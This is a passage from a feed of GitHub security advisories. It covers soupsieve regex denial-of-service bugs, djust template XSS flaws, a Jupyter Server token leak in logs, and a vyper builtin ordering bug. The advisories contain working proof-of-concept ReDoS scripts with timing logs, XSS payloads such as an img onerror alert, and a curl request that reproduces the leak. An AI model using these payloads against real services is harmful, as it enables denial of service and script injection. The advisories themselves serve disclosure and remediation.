payload = "[a=" + "a" * 12000
dt, st = compile_time(payload)
print(f"\n[+] Single call: compile('[a=' + 'a'*12000)  (len={len(payload)})")
print(f"[+] wall time = {dt:.2f} s   [{st}]")
</code></pre>
<p>End-to-end note: <code>bs4.BeautifulSoup(html).select(payload)</code> reaches the same <code>compile()</code> path, so the stall is triggerable directly through BeautifulSoup with a user-supplied selector. Verified on bs4 4.15.0 + soupsieve 2.8.4: <code>soup.select("[a=" + "a"*6000)</code> took ~5.0 s for one call (evidence: <code>poc/evidence_bs4_select_PUBLISHED_2.8.4.log</code>).</p>
<h2 id="evidence--head-29-verbatim-pocevidence_redos_compilelog">Evidence — HEAD 2.9 (verbatim <code>poc/evidence_redos_compile.log</code>)</h2>
<pre><code>soupsieve 2.9

Payload A: '[a=' + 'a'*n   (unterminated attribute value)
  n=1000   len=1003        214.8 ms  [SelectorSyntaxError]
  n=2000   len=2003        504.7 ms  [SelectorSyntaxError]
  n=4000   len=4003       2031.9 ms  [SelectorSyntaxError]
  n=8000   len=8003       8091.3 ms  [SelectorSyntaxError]

Payload B: 'a'*n + '!'   (identifier run + invalid trailing char)
  n=2000   len=2001         79.7 ms  [SelectorSyntaxError]
  n=4000   len=4001        322.9 ms  [SelectorSyntaxError]
  n=8000   len=8001       1328.9 ms  [SelectorSyntaxError]
  n=16000  len=16001      5379.4 ms  [SelectorSyntaxError]

[+] Single call: compile('[a=' + 'a'*12000)  (len=12003)
[+] wall time = 18.28 s   [SelectorSyntaxError]
</code></pre>
<h2 id="evidence--published-284-verbatim-pocevidence_redos_compile_published_284log">Evidence — published 2.8.4 (verbatim <code>poc/evidence_redos_compile_PUBLISHED_2.8.4.log</code>)</h2>
<pre><code>soupsieve 2.8.4
Payload A: '[a=' + 'a'*n
  n=1000   len=1003        113.9 ms  [SelectorSyntaxError]
  n=2000   len=2003        457.2 ms  [SelectorSyntaxError]
  n=4000   len=4003       1816.8 ms  [SelectorSyntaxError]
  n=8000   len=8003       7299.0 ms  [SelectorSyntaxError]
[+] Single call: compile('[a=' + 'a'*12000)  wall time = 16.57 s   [SelectorSyntaxError]
</code></pre>
<h2 id="impact--calibrated">Impact — calibrated</h2>
<ul>
<li>Confirmed: quadratic CPU consumption per <code>compile()</code>/<code>select()</code> call on an attacker-controlled selector. ~8 KB → ~8 s; ~12 KB → ~17 s; scaling ~×4 per input doubling. A handful of such requests exhausts a worker/thread and degrades or stalls the service (single-threaded regex holds the GIL).</li>
<li>Realistic exposure: services that accept user-supplied CSS selectors and feed them to BeautifulSoup/soupsieve.</li>
<li>NOT claimed: exponential blowup, memory corruption, or code execution. This is strictly an availability (DoS) issue, and only where selectors are attacker-influenced. Applications using only fixed selectors are unaffected — stated to avoid inflation.</li>
</ul>
<h2 id="remediation">Remediation</h2>
<ul>
<li>Remove the adjacent-quantifier ambiguity in <code>IDENTIFIER</code>: match a single leading non-digit character then the remaining class once, e.g. <code>(?:-?(?:[classA]|ESC)(?:[classB]|ESC)*|--(?:[classB]|ESC)*)</code>, so no <code>+</code>/<code>*</code> pair spans the same characters.</li>
<li>Alternatively use atomic grouping / possessive quantifiers where supported (<code>(?&gt;...)</code>, <code>*+</code>) to forbid backtracking into the identifier run.</li>
<li>Defense-in-depth: cap selector length before compiling (reject selectors beyond a sane bound), since CSS selectors are realistically short.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/facelessuser/soupsieve/security/advisories/GHSA-gjv8-xp57-g29c">https://github.com/facelessuser/soupsieve/security/advisories/GHSA-gjv8-xp57-g29c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-86000">https://nvd.nist.gov/vuln/detail/CVE-2026-86000</a></li>
<li><a href="https://github.com/facelessuser/soupsieve/commit/ce44e4996e6632871c18cdd7a7fb641be8ef34ef">https://github.com/facelessuser/soupsieve/commit/ce44e4996e6632871c18cdd7a7fb641be8ef34ef</a></li>
<li><a href="https://github.com/facelessuser/soupsieve/releases/tag/2.9">https://github.com/facelessuser/soupsieve/releases/tag/2.9</a></li>
<li><a href="https://github.com/advisories/GHSA-gjv8-xp57-g29c">https://github.com/advisories/GHSA-gjv8-xp57-g29c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gjv8-xp57-g29c</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T20:32:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[soupsieve] Soup Sieve: Polynomial-time ReDoS (O(n²)) in the whitespace/comment trimming regex `RE_WS_END` (triggers on VALID selectors)]]></title>
        <id>https://github.com/advisories/GHSA-j934-xhv5-fg8f</id>
        <link href="https://github.com/advisories/GHSA-j934-xhv5-fg8f"/>
        <updated>2026-09-17T20:32:55.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>Before tokenizing, <code>selector_iter</code> trims leading/trailing whitespace and comments by running two regexes over the whole raw selector with <code>.search()</code>. The trailing one, <code>RE_WS_END = re.compile(r'{WSC}*$')</code>, is anchored only at the end (<code>$</code>), not the start. Because <code>.search()</code> retries the pattern at every offset, a long run of whitespace or CSS comments that is not sitting exactly at the end of the string makes each retry greedily consume the run and then fail <code>$</code>, producing O(n²) time. This triggers on perfectly valid selectors — e.g. a descendant combinator with a long whitespace gap, <code>a</code> + <code>" "*n</code> + <code>b</code> — so no malformed input is required. A single valid ~20 KB selector stalls the interpreter for ~10 s of CPU.</p>
<h2 id="trust-model-q0">Trust model (Q0)</h2>
<p>The selector string is the input, reaching this code via <code>soupsieve.compile()</code>, the <code>soupsieve.select/iselect/match/filter</code> helpers, and BeautifulSoup's <code>soup.select(selector)</code> / <code>soup.select_one(selector)</code>. Exploitable wherever an application passes a user-controlled CSS selector to BeautifulSoup/soupsieve. Applications using only hard-coded selectors are unaffected.</p>
<h2 id="root-cause-exact-anchors--srcsoupsievecss_parserpy">Root cause (exact anchors) — <code>src/soupsieve/css_parser.py</code></h2>
<pre><code class="language-python"># line 185-186
RE_WS_BEGIN = re.compile(fr'^{WSC}*')   # anchored at start -&gt; .search() only tries pos 0 -&gt; linear (safe)
RE_WS_END   = re.compile(fr'{WSC}*$')   # NOT anchored at start -&gt; .search() tries every offset

# selector_iter, lines ~1322-1326
m = RE_WS_BEGIN.search(pattern)
index = m.end(0) if m else 0
m = RE_WS_END.search(pattern)                     # &lt;-- O(n^2) here
end = (m.start(0) - 1) if m else (len(pattern) - 1)
</code></pre>
<p><code>WSC = (?:{WS}|{COMMENTS})</code>. For <code>RE_WS_END = (?:WS|COMMENTS)*$</code>, <code>.search()</code> walks start offsets 0..n. Whenever the offset lands inside a long whitespace/comment run, <code>(?:WS|COMMENTS)*</code> greedily consumes to the run's end, then <code>$</code> fails (a non-whitespace char follows), the engine backtracks the whole run, the offset advances by one, and the work repeats — O(n) offsets × O(n) per attempt = O(n²). <code>RE_WS_BEGIN</code> avoids this because <code>^</code> pins it to a single start offset.</p>
<p>The intent (trim trailing whitespace/comments) can be met with an anchored/loopless approach; the current unanchored <code>.search()</code> of a <code>*$</code> pattern is the defect.</p>
<h2 id="reproduction-environment-discipline-12--published-artifact">Reproduction environment (discipline #12 — published artifact)</h2>
<ul>
<li>git HEAD <code>751c57b</code> (2.9, <code>PYTHONPATH=src</code>): <code>cd src &amp;&amp; python3 ../poc/poc_redos_ws_trim.py</code>.</li>
<li>Published PyPI <code>soupsieve 2.8.4</code> (fresh <code>uv pip install soupsieve beautifulsoup4</code>): <code>cd poc &amp;&amp; ../.venv-published/bin/python poc_redos_ws_trim.py</code> → same O(n²) (evidence: <code>poc/evidence_redos_ws_trim_PUBLISHED_2.8.4.log</code>).</li>
<li>Python 3.11.15 and 3.14.6 both reproduce.</li>
</ul>
<h2 id="poc-pocpoc_redos_ws_trimpy">PoC (<code>poc/poc_redos_ws_trim.py</code>)</h2>
<pre><code class="language-python">import sys, time
sys.path.insert(0, ".")
import soupsieve as sv

def ct(sel):
    t0 = time.perf_counter()
    try:
        sv.compile(sel); st = "ok"
    except Exception as e:
        st = type(e).__name__
    return time.perf_counter() - t0, st

print(f"soupsieve {sv.__version__}\n")

print("VALID selector 'a' + ' '*n + 'b'  (descendant combinator, lots of whitespace):")
for n in (2000, 4000, 8000, 16000):
    dt, st = ct("a" + " " * n + "b")
    print(f"  n={n:&lt;6} len={n+2:&lt;7} {dt*1000:9.1f} ms  [{st}]")

payload = "a" + " " * 20000 + "b"
dt, st = ct(payload)
print(f"\n[+] Single call: compile('a' + ' '*20000 + 'b')  (len={len(payload)})")
print(f"[+] wall time = {dt:.2f} s   [{st}]")
</code></pre>
<p>Isolated confirmation that the cost is in <code>RE_WS_END.search</code> specifically (<code>poc/isolate_ws_trim.py</code>): <code>RE_WS_END</code> on <code>"div"+" "*n+"&gt;"</code> is O(n²) (2000→100 ms, 4000→448 ms, 8000→1622 ms, 16000→6719 ms), while the start-anchored <code>RE_WS_BEGIN</code> on <code>" "*n+"x"</code> stays linear (32000→1.5 ms). Profiling <code>compile</code> shows the entire wall time in 2 <code>re.Pattern.search</code> calls, not <code>.match</code>.</p>
<h2 id="evidence--head-29-verbatim-pocevidence_redos_ws_trimlog">Evidence — HEAD 2.9 (verbatim <code>poc/evidence_redos_ws_trim.log</code>)</h2>
<pre><code>soupsieve 2.9

VALID selector 'a' + ' '*n + 'b'  (descendant combinator, lots of whitespace):
  n=2000   len=2002        112.3 ms  [ok]
  n=4000   len=4002        411.5 ms  [ok]
  n=8000   len=8002       1602.9 ms  [ok]
  n=16000  len=16002      6464.1 ms  [ok]

VALID-looking 'a' + '/*x*/'*n + 'b'  (CSS comment run):
  n=1000   len=5002         48.9 ms  [SelectorSyntaxError]
  n=2000   len=10002       194.8 ms  [SelectorSyntaxError]
  n=4000   len=20002       780.2 ms  [SelectorSyntaxError]
  n=8000   len=40002      3145.3 ms  [SelectorSyntaxError]

[+] Single call: compile('a' + ' '*20000 + 'b')  (len=20002)
[+] wall time = 10.23 s   [ok]
</code></pre>
<h2 id="evidence--published-284-verbatim-pocevidence_redos_ws_trim_published_284log">Evidence — published 2.8.4 (verbatim <code>poc/evidence_redos_ws_trim_PUBLISHED_2.8.4.log</code>)</h2>
<pre><code>soupsieve 2.8.4

VALID selector 'a' + ' '*n + 'b':
  n=2000   len=2002        102.7 ms  [ok]
  n=4000   len=4002        404.3 ms  [ok]
  n=8000   len=8002       1618.2 ms  [ok]
  n=16000  len=16002      6457.9 ms  [ok]
[+] Single call: compile('a' + ' '*20000 + 'b')  wall time = 10.11 s   [ok]
</code></pre>
<h2 id="impact--calibrated">Impact — calibrated</h2>
<ul>
<li>Confirmed: quadratic CPU per <code>compile()</code>/<code>select()</code> call on an attacker-controlled selector, triggered by a long internal whitespace or CSS-comment run. ~8 KB → ~1.6 s; ~20 KB → ~10 s; scaling ~×4 per input doubling. Notably fires on WELL-FORMED selectors, so it does not depend on a parser error path.</li>
<li>Realistic exposure: services that accept user-supplied CSS selectors and feed them to BeautifulSoup/soupsieve.</li>
<li>NOT claimed: exponential blowup, memory corruption, or code execution. Availability (DoS) only, and only where selectors are attacker-influenced.</li>
</ul>
<h2 id="distinction-from-the-identifiervalue-redos">Distinction from the IDENTIFIER/VALUE ReDoS</h2>
<p>This is a separate root cause and a separate fix: the cost here is entirely in the <code>RE_WS_END = {WSC}*$</code> trim step run with <code>.search()</code> before tokenizing (measured in <code>re.Pattern.search</code>), whereas the IDENTIFIER/VALUE issue is adjacent-quantifier backtracking during token <code>.match()</code>. They can be fixed independently.</p>
<h2 id="remediation">Remediation</h2>
<ul>
<li>Anchor or de-loop the trailing-trim step: instead of <code>.search()</code> of <code>{WSC}*$</code>, scan trailing whitespace/comments from the end directly (e.g. reverse scan, or <code>re.compile(r'^{WSC}*').match</code> on a reversed-equivalent), so no per-offset retry occurs.</li>
<li>Alternatively strip whitespace/comments in a single forward tokenizing pass rather than with a pre-pass <code>*$</code> search.</li>
<li>Defense-in-depth: cap selector length before compiling.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/facelessuser/soupsieve/security/advisories/GHSA-j934-xhv5-fg8f">https://github.com/facelessuser/soupsieve/security/advisories/GHSA-j934-xhv5-fg8f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-85999">https://nvd.nist.gov/vuln/detail/CVE-2026-85999</a></li>
<li><a href="https://github.com/facelessuser/soupsieve/commit/cf198fcddc9230f06ed39f974eba0ce076b85cda">https://github.com/facelessuser/soupsieve/commit/cf198fcddc9230f06ed39f974eba0ce076b85cda</a></li>
<li><a href="https://github.com/facelessuser/soupsieve/releases/tag/2.9">https://github.com/facelessuser/soupsieve/releases/tag/2.9</a></li>
<li><a href="https://github.com/advisories/GHSA-j934-xhv5-fg8f">https://github.com/advisories/GHSA-j934-xhv5-fg8f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j934-xhv5-fg8f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-09-17T20:32:53.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust: A template binding inherits a context safety grant it never earned (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-xjw9-38cr-6372</id>
        <link href="https://github.com/advisories/GHSA-xjw9-38cr-6372"/>
        <updated>2026-09-17T20:31:49.000Z</updated>
        <content type="html"><![CDATA[<p>A context safety grant was inherited by a template <strong>binding</strong> that never earned it, so rebinding a name the view had marked safe left the mark attached to the new, attacker-controlled value.</p>
<p>djust's context safety channel is keyed by <strong>name</strong>, not by value. Every bind copied the value and left the grant in place:</p>
<pre><code>view marks   p = mark_safe('&lt;b&gt;trusted&lt;/b&gt;')
template     {% with p=user_input %}{{ p }}{% endwith %}

  djust   '&lt;img src=x onerror=alert(1)&gt;'          &lt;- executes
  django  '&amp;lt;img src=x onerror=alert(1)&amp;gt;'
</code></pre>
<h2 id="affected-binds">Affected binds</h2>
<p>Eight distinct shapes were live. All are fixed in 1.1.2:</p>
<table>
<thead>
<tr>
<th>shape</th>
<th>example</th>
</tr>
</thead>
<tbody><tr>
<td><code>{% with %}</code> rebinding a marked name</td>
<td><code>{% with p=hostile %}{{ p }}{% endwith %}</code></td>
</tr>
<tr>
<td><code>{% with %}</code> <strong>descendant</strong> of a rebound name</td>
<td><code>{% with p=hostile %}{{ p.a }}{% endwith %}</code></td>
</tr>
<tr>
<td><code>{% with %}</code> binding over a marked name</td>
<td><code>{% with q=hostile %}{{ q }}{% endwith %}</code></td>
</tr>
<tr>
<td><code>{% for %}</code> loop variable</td>
<td><code>{% for p in hostiles %}{{ p }}{% endfor %}</code></td>
</tr>
<tr>
<td><code>{% for %}</code> descendant</td>
<td><code>{% for p in hostiles %}{{ p.a }}{% endfor %}</code></td>
</tr>
<tr>
<td><code>{% for %}</code> tuple unpacking</td>
<td><code>{% for k, v in rows %}{{ v }}{% endfor %}</code></td>
</tr>
<tr>
<td><code>{% include … with %}</code></td>
<td><code>{% include "c.html" with q=hostile %}</code></td>
</tr>
<tr>
<td>assign tags</td>
<td><code>{% … as x %}</code></td>
</tr>
</tbody></table>
<p>No filter chain and no <code>|safe</code> anywhere in the template is required. The precondition is that the application marked <em>some</em> value safe under a name that a template later rebinds — an ordinary pattern, since a view commonly marks trusted markup safe and templates commonly reuse short names such as <code>p</code>, <code>item</code> or <code>row</code>.</p>
<h2 id="impact">Impact</h2>
<p>Stored or reflected XSS in any djust application that combines <code>mark_safe</code> (or any framework path that grants a context key safety) with a template that rebinds that name. Exploitation requires no unusual template construct.</p>
<h2 id="patches">Patches</h2>
<p>Fixed in <strong>1.1.2</strong>, and in 1.2.0 (<code>main</code>).</p>
<p>The rule is that a bind <strong>replaces</strong> the grant rather than inheriting one. It is stated that way deliberately: the originally reported defects pointed the <em>opposite</em> direction — a grant being <strong>lost</strong> across some binds, causing over-escaping — and fixing only the reported direction would have left this leak in place. Both directions are the same rule.</p>
<p><strong>Not fixed in 1.1.2</strong>, and tracked for 1.2.0: two over-escaping cases where a grant fails to travel with a value that legitimately carries one (<code>{% with body=post.text|linebreaks %}</code>, and <code>mark_safe</code> reaching a template through <code>dict.values</code> / <code>dict.items</code>). Both escape <em>more</em> than Django rather than less, so neither is a leak.</p>
<h2 id="workarounds">Workarounds</h2>
<p>Before upgrading, avoid reusing a context name for both <code>mark_safe</code>'d content and untrusted input, and avoid rebinding such a name in <code>{% with %}</code>, <code>{% for %}</code>, <code>{% include … with %}</code> or an assign tag.</p>
<h2 id="credit">Credit</h2>
<p>Found while preparing the 1.1.1 security release: the reproducer published in GHSA-9395-2g46-rj3f was run against the built 1.1.1 artifact before that advisory was published, and proved the class was still live. Publishing the original text would have reported this class as patched when it was not.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-xjw9-38cr-6372">https://github.com/djust-org/djust/security/advisories/GHSA-xjw9-38cr-6372</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.1.2">https://github.com/djust-org/djust/releases/tag/v1.1.2</a></li>
<li><a href="https://github.com/advisories/GHSA-xjw9-38cr-6372">https://github.com/advisories/GHSA-xjw9-38cr-6372</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-xjw9-38cr-6372</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T20:31:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[djust] djust: Six template-layer defects emit attacker-controlled markup unescaped (XSS)]]></title>
        <id>https://github.com/advisories/GHSA-9395-2g46-rj3f</id>
        <link href="https://github.com/advisories/GHSA-9395-2g46-rj3f"/>
        <updated>2026-09-17T20:31:45.000Z</updated>
        <content type="html"><![CDATA[<p>Five independent defects in djust's template auto-escaping cause attacker-controlled input to be rendered as live markup where Django escapes it. All four are present in shipped 1.1.0 and are fixed in 1.1.1.</p>
<p>They share one shape: <strong>a filter or grant that escapes nothing itself and relies on the render-time auto-escape, which something downstream then removes.</strong> They are grouped into a single advisory because the mitigation is identical — upgrade to 1.1.1 — and because no single one of them is meaningfully actionable in isolation.</p>
<h2 id="1-linenumbers-never-escaped-its-input-2291">1. <code>linenumbers</code> never escaped its input (#2291)</h2>
<pre><code>{{ p|linenumbers|safe }}   with p = '&lt;img src=x onerror=alert(1)&gt;'
  djust   '1. &lt;img src=x onerror=alert(1)&gt;'      &lt;- executes
  django  '1. &amp;lt;img src=x onerror=alert(1)&amp;gt;'
</code></pre>
<p>The filter deferred all escaping to render time; a trailing <code>|safe</code> suppressed exactly that. The exposure is wider than the <code>|safe</code> form: <strong>any downstream filter that reads the output as markup is affected</strong>, including <code>{{ p|linenumbers|truncatechars_html:"5" }}</code>, which contains no <code>|safe</code> at all.</p>
<h2 id="2-escape-was-a-no-op-2281">2. <code>escape</code> was a no-op (#2281)</h2>
<pre><code>{{ p|escape|safe }}
  djust   '&lt;img src=x onerror=alert(1)&gt;'          &lt;- executes
  django  '&amp;amp;lt;img src=x onerror=alert(1)&amp;amp;gt;'
</code></pre>
<p>Django's <code>escape</code> is eager (<code>conditional_escape</code>, returning <code>SafeString</code>). djust's returned its input unchanged and let the render site escape it — indistinguishable for <code>{{ p|escape }}</code> alone, wrong for every chain. The security cell is <code>{{ p|escape|safe }}</code>: an idiom that reads as "escape it, then it is safe to emit" — which is what Django's semantics make true — was a bare <code>|safe</code> on attacker input. A sweep of every length-2 and length-3 chain containing <code>escape</code> found <strong>104</strong> live-markup cells.</p>
<h2 id="3-unordered_list--safeseq-handed-a-string-back-under-a-safe-grant-2274">3. <code>unordered_list</code> / <code>safeseq</code> handed a string back under a safe grant (#2274)</h2>
<p>Both carry an unconditional "emit without escaping" grant, earned because they escape every item they emit. Given a <strong>string</strong> rather than a sequence they emitted nothing and returned the input verbatim under that same grant, making <code>{{ hostile|safeseq }}</code> an exact synonym for <code>|safe</code> with no <code>mark_safe</code> anywhere in the template.</p>
<h2 id="4-a-safety-grant-outlived-the-value-it-was-granted-for-2300">4. A safety grant outlived the value it was granted for (#2300)</h2>
<p><strong>No filter chain and no <code>|safe</code> anywhere; a bare <code>{{ p }}</code> is the whole reproducer.</strong></p>
<p>Safe context keys accumulated on the view and were never revoked, so a key marked safe once stayed safe for the lifetime of the view — which spans <strong>every event on a WebSocket connection</strong>:</p>
<pre><code class="language-python">render 1:  p = mark_safe('&lt;b&gt;trusted&lt;/b&gt;')     -&gt;  '&lt;b&gt;trusted&lt;/b&gt;'   correct
render 2:  p = '&lt;img src=x onerror=alert(1)&gt;'  -&gt;  executes
</code></pre>
<p>A view that renders trusted markup into a variable and later renders user input into the same variable emits it live.</p>
<h2 id="5-a-custom-tag-handlers-return-was-emitted-raw--including-djusts-own--render_slot--2379">5. A custom tag handler's return was emitted raw — including djust's own <code>{% render_slot %}</code> (#2379)</h2>
<p><strong>Reachable with no <code>|safe</code>, no <code>mark_safe</code>, and no application code: using component slots is enough.</strong></p>
<p>Django's <code>SimpleNode.render</code> runs <code>conditional_escape</code> over a <code>simple_tag</code>'s return
unless it carries <code>__html__</code>. djust inserted the return verbatim, so a handler as
ordinary as <code>return f"Hello {name}"</code> emitted attacker markup live.</p>
<p>Of the 221 handlers djust registers, one echoes a context value unescaped —
<code>render_slot</code>, the framework's own function-component/slot tag:</p>
<pre><code>{% render_slot p %}     p = '&lt;img src=x onerror=alert(1)&gt;'

  djust   '&lt;img src=x onerror=alert(1)&gt;'          &lt;- executes
  django  '&amp;lt;img src=x onerror=alert(1)&amp;gt;'
</code></pre>
<p>Together with defect 3 this is one of the two classes reachable without the
application writing anything unusual.</p>
<h2 id="6-linebreaks--linebreaksbr--and-safe-was-the-only-spelling-that-worked-2284">6. <code>linebreaks</code> / <code>linebreaksbr</code> — and <code>|safe</code> was the only spelling that worked (#2284)</h2>
<p><code>linebreaks</code> emits <code>&lt;p&gt;</code>/<code>&lt;br&gt;</code> but neither escaped its content nor reported its
output safe. The plain spelling therefore escaped the filter's <strong>own</strong> tags and
printed a literal <code>&lt;p&gt;</code> on the page, so <code>|safe</code> was the only form that rendered
at all — and that form emitted the content live:</p>
<pre><code>{{ bio|linebreaks }}         renders literal '&lt;p&gt;' text        (visibly broken)
{{ bio|linebreaks|safe }}    '&lt;img src=x onerror=alert(1)&gt;'    &lt;- executes
</code></pre>
<p>Because the broken spelling is the one a developer discards, the vulnerable
spelling is the one that ships. Any application rendering user-entered text with
paragraph breaks is written that way.</p>
<h2 id="impact">Impact</h2>
<p>Stored or reflected XSS in any djust application that renders untrusted input through the affected filters, or that reuses a context variable which was previously marked safe. Exploitation requires no special configuration. Defects 3, 4 and 5 require no unusual template construct at all — defect 5 needs only that the application use component slots, and defect 6's vulnerable spelling is the only one that renders correctly.</p>
<h2 id="patches">Patches</h2>
<p>Fixed in <strong>1.1.1</strong>, and in <strong>1.2.0</strong> (<code>main</code>).</p>
<p>1.1.1 re-implements each fix against 1.1.0's own code rather than back-porting <code>main</code>'s, which depends on a value-level safety model 1.1.0 does not have. Three consequences are documented in the 1.1.1 CHANGELOG and are all in the <strong>over-escaping</strong> direction: <code>{{ p|escape|F }}</code> double-escapes for a plain following filter <code>F</code>; <code>{% render_slot slot.content %}</code> over-escapes; and a <code>mark_safe</code>d value passed through <code>|escape</code> is escaped rather than passed through.</p>
<p><strong>Not fixed in 1.1.1</strong>, and tracked separately: application-written tag handlers that return attacker data as a plain <code>str</code> (only djust's own <code>render_slot</code> is covered by defect 5), and a <code>{% with %}</code>/<code>{% for %}</code> bind inheriting a safety grant it never earned. Both are fixed in 1.2.0.</p>
<h2 id="workarounds">Workarounds</h2>
<p>None complete. Before upgrading, avoid <code>|safe</code> after any filter in a chain, avoid <code>safeseq</code>/<code>unordered_list</code> on values that may be strings, and avoid reusing a context variable for both <code>mark_safe</code> content and untrusted input.</p>
<h2 id="credit">Credit</h2>
<p>Found during an internal Django-parity audit by a registry-wide differential that compares djust's escaping capabilities against Django's across every filter chain, rather than by inspection.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/djust-org/djust/security/advisories/GHSA-9395-2g46-rj3f">https://github.com/djust-org/djust/security/advisories/GHSA-9395-2g46-rj3f</a></li>
<li><a href="https://github.com/djust-org/djust/releases/tag/v1.1.1">https://github.com/djust-org/djust/releases/tag/v1.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-9395-2g46-rj3f">https://github.com/advisories/GHSA-9395-2g46-rj3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9395-2g46-rj3f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T20:31:43.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jupyter_server] Jupyter Server: 5xx request logging leaks token-bearing Referer header values]]></title>
        <id>https://github.com/advisories/GHSA-c3mw-737p-c7g2</id>
        <link href="https://github.com/advisories/GHSA-c3mw-737p-c7g2"/>
        <updated>2026-09-17T20:28:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>When a request returns a 500, <code>jupyter_server/log.py</code> logs a small JSON block of request headers. </p>
<p>The Referer header was copied into it as-is, so a token in the Referer URL ended up in the logs in plain text.</p>
<h3 id="impact">Impact</h3>
<p>Anyone who can read the server logs can pick tokens out of these 500 entries. Tokens end up in the Referer during normal token-based login and launch flows.</p>
<p>Affected: all versions before 2.21.0.</p>
<h3 id="poc">PoC</h3>
<p>Any malformed request that returns a 500 works:</p>
<pre><code class="language-bash">curl -i -X POST \
  -H 'Content-Type: application/json' \
  -H 'Referer: http://127.0.0.1:8899/tree?token=REFERTOKEN' \
  --data '{"name":123}' \
  'http://127.0.0.1:8899/api/kernels?token=VALIDTOKEN'
</code></pre>
<p>The log shows the token twice, once raw and once redacted:</p>
<pre><code>"Referer": "http://127.0.0.1:8899/tree?token=REFERTOKEN",
[E ... ServerApp] 500 POST /api/kernels?token=[secret] (...) referer=http://127.0.0.1:8899/tree?token=[secret]
</code></pre>
<h3 id="patches">Patches</h3>
<p>Fixed in 2.21.0 by 5251352. Header values are now scrubbed before the block is logged. Upgrade to 2.21.0 or later.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Limit who can read the server logs. If you can, avoid flows that put the token in the URL.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/jupyter-server/jupyter_server/security/advisories/GHSA-c3mw-737p-c7g2">https://github.com/jupyter-server/jupyter_server/security/advisories/GHSA-c3mw-737p-c7g2</a></li>
<li><a href="https://github.com/jupyter-server/jupyter_server/pull/1681">https://github.com/jupyter-server/jupyter_server/pull/1681</a></li>
<li><a href="https://github.com/jupyter-server/jupyter_server/commit/52513529af7096e622c00911b17627b266294717">https://github.com/jupyter-server/jupyter_server/commit/52513529af7096e622c00911b17627b266294717</a></li>
<li><a href="https://github.com/jupyter-server/jupyter_server/releases/tag/v2.21.0">https://github.com/jupyter-server/jupyter_server/releases/tag/v2.21.0</a></li>
<li><a href="https://github.com/advisories/GHSA-c3mw-737p-c7g2">https://github.com/advisories/GHSA-c3mw-737p-c7g2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c3mw-737p-c7g2</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-09-17T20:28:55.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[vyper] incorrect order of evaluation of side effects for some builtins]]></title>
        <id>https://github.com/advisories/GHSA-4hg4-9mf5-wxxq</id>
        <link href="https://github.com/advisories/GHSA-4hg4-9mf5-wxxq"/>
        <updated>2026-09-17T19:24:17.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The order of evaluation of the arguments of the builtin functions <code>uint256_addmod</code>, <code>uint256_mulmod</code>, <code>ecadd</code> and <code>ecmul</code> does not follow source order.
• For <code>uint256_addmod(a,b,c)</code> and <code>uint256_mulmod(a,b,c)</code>, the order is <code>c,a,b</code>.
• For <code>ecadd(a,b)</code> and <code>ecmul(a,b)</code>, the order is <code>b,a</code>.</p>
<p>Note that this behaviour is problematic when the evaluation of one of the arguments produces side effects that other arguments depend on. </p>
<h3 id="patches">Patches</h3>
<p><a href="https://github.com/vyperlang/vyper/pull/3583">https://github.com/vyperlang/vyper/pull/3583</a></p>
<h3 id="workarounds">Workarounds</h3>
<p>When using builtins from the list above, make sure that the arguments of the expression do not produce side effects or, if one does, that no other argument is dependent on those side effects.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vyperlang/vyper/security/advisories/GHSA-4hg4-9mf5-wxxq">https://github.com/vyperlang/vyper/security/advisories/GHSA-4hg4-9mf5-wxxq</a></li>
<li><a href="https://github.com/vyperlang/vyper/pull/3583">https://github.com/vyperlang/vyper/pull/3583</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-41052">https://nvd.nist.gov/vuln/detail/CVE-2023-41052</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2023-168.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/vyper/PYSEC-2023-168.yaml</a></li>
<li><a href="https://github.com/vyperlang/vyper/commit/78fa8dd8f91ba0cb26277eeffb585c68c83e7daa">https://github.com/vyperlang/vyper/commit/78fa8dd8f91ba0cb26277eeffb585c68c83e7daa</a></li>
